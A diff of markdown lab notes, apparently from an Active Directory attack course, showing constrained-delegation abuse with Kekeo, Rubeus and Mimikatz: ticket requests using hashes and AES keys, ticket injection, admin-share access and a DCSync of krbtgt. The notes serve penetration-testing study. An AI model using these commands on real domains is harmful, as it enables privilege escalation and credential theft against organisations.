@@ -967,71 +967,132 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 ```
 • Enumerate users and computers with constrained delegation enabled
+
 • Using PowerView
 
+  
+
 Get-DomainUser -TrustedToAuth
+
 Get-DomainComputer -TrustedToAuth
 
+  
+
 • Using ActiveDirectory module:
+
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 
+  
+
 Abusing with Kekeo
+
 • Either plaintext password or NTLM hash/AES keys is required. We already have
+
 access to websvc's hash from dcorp-adminsrv
+
 • Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
+
+  
 
 kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
 
+  
+
 • Using s4u from Kekeo, we request a TGS (steps 4 & 5):
 
+  
+
 tgs::s4u
+
 /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
 
+  
+  
 
 Abusing with Kekeo
+
 • Using mimikatz, inject the ticket:
+
+  
 
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
 
+  
+
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+  
 
 • Abusing with Rubeus
+
 • We can use the following command (We are requesting a TGT and TGS in a single command):
 
+  
+
 Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87
+
 9470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
+
+  
 
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 
+  
+
 Abusing with Kekeo
+
 • Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash
+
 • Using asktgt from Kekeo, we request a TGT:
+
+  
 
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
 
+  
+
 • Using s4u from Kekeo_one (no SNAME validation):
+
+  
 
 tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
 
+  
+
 Abusing with Kekeo
+
 • Using mimikatz:
 
+  
+
 Invoke-Mimikatz -Command '"kerberos::ptt
+
 TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
+
+  
 
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
+  
+  
 
 Abusing with Rubeus
+
 • We can use the following command (We are requesting a TGT and TGS in a
+
 single command):
+
+  
 
 Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
 
+  
+
 • After injection, we can run DCSync:
 
-C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+  
 
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 
 
 ```
